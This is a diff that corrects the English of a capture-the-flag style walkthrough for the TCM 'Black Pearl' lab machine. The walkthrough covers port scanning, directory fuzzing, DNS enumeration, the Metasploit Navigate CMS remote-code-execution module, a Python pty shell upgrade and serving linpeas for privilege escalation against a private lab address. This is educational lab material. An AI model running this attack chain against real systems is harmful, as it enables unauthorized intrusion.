@@ -17,7 +17,7 @@ cover:
 
 ## Nmap:
 
-I have runned same again nmaps scan
+I ran the same nmap scan again
 
 ```bash
 nmap -T4 -p- -A 192.168.100.131
@@ -33,19 +33,19 @@ nmap -T4 -p- -A 192.168.100.131
 
 We got a default webpage.
 
-I'm going to run FuFF and Gobuster to find extera directorys.
+I'm going to run FFUF and Gobuster to find extra directories.
 
 gobuster dir -u http://192.168.100.131:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx
 
-I have found a /secret directory.
+I found a /secret directory.
 
-In the page source i have found a e-mail adres.
+In the page source I found an email address.
 
 alek@blackpearl.tcm
 
 ## Port 53
 
-Here I'm gonna use a tool dnsrecon
+Here I'm going to use a tool called dnsrecon.
 
 ```bash
 dnsrecon -r 127.0.0.0/24 -n 192.168.100.128 -d blah
@@ -53,25 +53,25 @@ dnsrecon -r 127.0.0.0/24 -n 192.168.100.128 -d blah
 
 - dnsrecon
 - -r this is for our range
-- 127.0.0.0/24 we gonna scan our localhost machine
-- -n ip adres of te box we are looking for
+- 127.0.0.0/24 the range we scan on the local network
+- -n IP address of the box we are looking for
 - -d is needed for our domain
 
 We can see now under http://blackpearl.tcm/
 ![php website](php-website.png)
 
-Im gonna use Fuzz one more time to see if we can get more information
+I'm going to use FFUF one more time to see if we can get more information.
 ```bash
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
 ```
 ![navigate](navigate.png)
 
-We can se a /navigate directory now. We get a login screen website.
+We can see a /navigate directory now. It gives a login screen.
 ![Login screen](login-screen.png)
 
 ### Metasploit
 
-I'm going use this exploit from https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
+I'm going to use this exploit from https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
 
 ```bash
 msf > use exploit/multi/http/navigate_cms_rce
@@ -88,27 +88,27 @@ set VHOST blackpearl.tcm
 We can run this exploit
 ![Running the exploit against TCM Black Pearl](run.png)
 
-We need to get better shell on this machine.
-We can do this with python script if python is on the machine
+We need a better shell on this machine.
+We can do this with a Python script if Python is on the machine
 With command:
 ```bash
 which python
 ```
 
-We can see python on the machine
+We can see Python on the machine
 ![python](python.png)
 
-We can paste now this script:
+Now we can paste this script:
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 ![python script](python-script.png)
 
-### Privilage Escalation
+### Privilege Escalation
 
-We need now to get root on this machine So, I decided to get linpeas to do it for me
+Now we need to get root on this machine. I decided to use linpeas to do it for me
 
-I have started http server on my attack machine to send linpeas
+I started an HTTP server on my attack machine to serve linpeas
 
 
 ![python3 server](python3-server.png)
